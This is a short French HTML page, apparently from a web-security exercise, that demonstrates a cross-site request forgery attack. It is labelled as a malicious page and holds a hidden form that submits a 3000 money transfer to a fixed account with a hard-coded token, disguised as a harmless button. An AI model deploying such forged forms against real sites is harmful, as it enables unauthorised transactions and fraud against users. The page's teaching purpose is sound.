<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attaque CSRF</title>
</head>
<body>
    <h1>Page malveillante</h1>
    <p>Pour un attaquant il pourrait lancer le formulaire instantanément 
    </p>
    <form action="php/csrf_exo1.php" method="POST" id="csrfForm">
        <input type="hidden" name="to_account" value="987654321"> 
        <input type="hidden" name="amount" value="3000">
        <input type="hidden" name="csrf_token" value="02edbb64c751a7ddcc0a90c3cc110ecc57b788457365ec98f4168123c2974a77">
        <button type="submit">Cliquez ici pour transférer de l'argent</button>
    </form>
</body>
</html>
